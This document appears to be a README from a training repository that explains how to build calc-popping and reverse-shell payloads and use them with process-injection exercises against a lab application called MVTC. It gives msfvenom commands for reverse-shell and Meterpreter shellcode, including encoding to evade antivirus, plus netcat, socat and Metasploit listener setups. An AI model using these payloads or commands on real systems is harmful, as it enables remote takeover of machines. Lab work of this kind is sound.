# Payload reference — calc.exe pop and reverse shell

Pre-written source files you can grab, change `LHOST`/`LPORT` if needed, build, and use with any of the injection techniques in the `docs/SOLUTIONS/13-*` through `18-*` writeups.

> ⚠️ **For authorized testing in isolated VMs only.** Do not use these on systems you do not own or are not explicitly authorized to assess.

---

## Folder layout

```
payloads/
├── README.md                 ← this file
├── pop-calc/
│   ├── pop_calc.cpp          ← EXE source (double-click = calc opens)
│   ├── pop_calc_dll.cpp      ← DLL source (LoadLibrary = calc opens)
│   └── build.ps1             ← builds both with MSVC or MinGW
└── reverse-shell/
    ├── revshell_pure.cpp     ← EXE source — pure WinSock, no shellcode
    ├── revshell_pure_dll.cpp ← DLL source — pure WinSock, no shellcode
    ├── revshell_sc.cpp       ← EXE source — runs msfvenom shellcode
    ├── revshell_sc_dll.cpp   ← DLL source — runs msfvenom shellcode
    └── build.ps1             ← builds all four
```

Two reverse-shell approaches ship because each has its use:
- **`_pure`** variants write everything in C using WinSock. No external tool needed. Easier for a tester to understand and modify. Does what msfvenom does under the hood, but transparently.
- **`_sc`** variants expect you to paste shellcode from `msfvenom`. More flexible (Meterpreter staging, encoding, encryption) but opaque.

---

## Pick a toolchain

Both of these build everything in this folder. Use whichever is installed.

### MSVC (recommended on Windows)

Comes with Visual Studio Build Tools (free). Open **"Developer PowerShell for VS 2022"** — `cl.exe` and `link.exe` are on PATH.

```powershell
# verify
cl /? | Select-Object -First 1   # should print "Microsoft (R) C/C++ Optimizing Compiler..."
```

### MinGW-w64 (works on Windows AND Linux)

Lightweight GCC toolchain. Yes, GCC builds Windows DLLs and EXEs — it has been able to since the 1990s.

**On Windows:**
```powershell
# install via chocolatey or scoop
choco install mingw         # or: scoop install gcc
# verify
x86_64-w64-mingw32-gcc --version
```

**On Linux / WSL / macOS (cross-compile):**
```bash
# Debian / Ubuntu / Kali
sudo apt install -y mingw-w64

# Fedora
sudo dnf install -y mingw64-gcc mingw64-gcc-c++

# macOS (Homebrew)
brew install mingw-w64

# verify
x86_64-w64-mingw32-gcc --version
```

---

## Quick build — one-shot

From either toolchain:

```powershell
# Windows / MSVC
cd payloads\pop-calc
powershell -ExecutionPolicy Bypass -File .\build.ps1

cd ..\reverse-shell
powershell -ExecutionPolicy Bypass -File .\build.ps1
```

Each `build.ps1` auto-detects `cl.exe` first, falls back to MinGW if not present. Output lands next to the source.

---

## Manual build — the exact commands

### MSVC — EXE

```powershell
cl /EHsc /O2 /nologo pop_calc.cpp /link /SUBSYSTEM:CONSOLE /Fe:pop_calc.exe
```

Flags:
- `/EHsc` — standard C++ exception handling
- `/O2` — optimize for speed (smaller code too)
- `/nologo` — suppresses the banner
- `/SUBSYSTEM:CONSOLE` — gives a console window; use `/SUBSYSTEM:WINDOWS` for silent GUI start

### MSVC — DLL

```powershell
cl /LD /EHsc /O2 /nologo pop_calc_dll.cpp /Fe:pop_calc_dll.dll
```

- `/LD` — build a DLL (also adds `/DLL` to the linker)
- No subsystem flag needed for DLLs

### MinGW-w64 — EXE

```bash
# Windows:  x86_64-w64-mingw32-gcc.exe
# Linux :   x86_64-w64-mingw32-gcc
x86_64-w64-mingw32-g++ -O2 -s -o pop_calc.exe pop_calc.cpp -lkernel32 -municode

# add -mwindows to hide the console
x86_64-w64-mingw32-g++ -O2 -s -o pop_calc.exe pop_calc.cpp -lkernel32 -municode -mwindows
```

Flags:
- `-O2` — optimize
- `-s` — strip symbols (smaller)
- `-municode` — enables Unicode `main`/`wmain`
- `-mwindows` — hide console (GUI subsystem)

### MinGW-w64 — DLL

```bash
x86_64-w64-mingw32-g++ -shared -O2 -s -o pop_calc_dll.dll pop_calc_dll.cpp \
    -lkernel32 -Wl,--subsystem,windows,--kill-at
```

- `-shared` — build a DLL
- `-Wl,--kill-at` — don't decorate exported names with `@N`

---

## Verifying the build

After building, confirm the architecture matches your target (MVTC.exe is x64):

```powershell
# with Visual Studio tools
dumpbin /headers pop_calc.exe | Select-String "machine"
# expect: "machine (x64)"

# with MinGW
file pop_calc.exe
# expect: "PE32+ executable (console) x86-64, for MS Windows"
```

---

## Reverse shell — generate the shellcode (for `_sc` variants only)

The `_sc` variants have a `const unsigned char buf[]` placeholder you must fill from `msfvenom`:

```bash
# on your Kali / testing box
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=10.0.0.5 LPORT=4444 \
    -f c -b '\x00\x0a\x0d'
```

Copy the entire `unsigned char buf[] = { 0xfc, 0x48, ... };` block into the `.cpp` file, replacing the placeholder.

**Meterpreter instead of plain shell:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.0.0.5 LPORT=4444 \
    -f c
```

**Encoded (if an AV eats your shellcode):**
```bash
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=10.0.0.5 LPORT=4444 \
    -f c -e x64/xor_dynamic -i 3
```

The `_pure` variants need no msfvenom — just change the `LHOST`/`LPORT` constants at the top of the file and rebuild.

---

## Set up the listener

Any one of these works for a plain reverse shell:

```bash
# netcat (simplest)
nc -lvnp 4444

# ncat (part of nmap) - preferred if you want TLS later
ncat -lvnp 4444

# socat (gives a proper PTY)
socat FILE:`tty`,raw,echo=0 TCP-LISTEN:4444

# metasploit (for Meterpreter sessions)
msfconsole -q -x "use exploit/multi/handler; \
                  set PAYLOAD windows/x64/shell_reverse_tcp; \
                  set LHOST 10.0.0.5; set LPORT 4444; \
                  set ExitOnSession false; exploit -j"
```

---

## Using with the injection techniques

For every writeup in `docs/SOLUTIONS/13-*` through `18-*`, when the walkthrough says *"the DLL's DllMain should…"* — substitute one of the DLLs here:

| Attack technique | DLL to inject | Catches |
|---|---|---|
| **#13 CreateRemoteThread + LoadLibrary** | `pop_calc_dll.dll` | calc.exe opens as MVTC child |
| **#13 CreateRemoteThread + LoadLibrary** | `revshell_pure_dll.dll` | shell lands at your listener as MVTC user |
| **#14 APC injection** | same two DLLs | fires on next alertable wait |
| **#15 Process hollowing** | `pop_calc.exe` / `revshell_pure.exe` | spawned MVTC runs your code instead |
| **#16 Reflective DLL** | reflective-wrapped `revshell_pure_dll.dll` | no loader-list trace |
| **#17 .NET Assembly.Load** | not these — use the .NET plugin from the writeup | runs inside MVTC's AppDomain |
| **#18 Thread hijacking** | `pop_calc_dll.dll` loaded via chained `LoadLibraryA` | hijacked thread opens calc then resumes |

---

## Common build errors

| Error | Fix |
|---|---|
| `cl: command not found` | Open "Developer PowerShell for VS" (adds MSVC to PATH) |
| `x86_64-w64-mingw32-gcc: command not found` | Install MinGW-w64 (see Toolchain section above) |
| MSVC: `LNK2019 unresolved external symbol` | Add the missing library to the link line: `/link ws2_32.lib` for WinSock, `kernel32.lib` is automatic |
| MinGW: `undefined reference to '__imp_*'` | Add `-lws2_32` for WinSock, `-ladvapi32`, etc. |
| EXE runs but opens no calc | You built x86 instead of x64 (or vice versa) and the target process can't `LoadLibrary` across bitness. Verify with `dumpbin /headers` or `file` |
| Reverse shell builds but never connects | Firewall on the attack box; check `netstat -an \| findstr 4444` on both sides; disable Windows Firewall during the test |
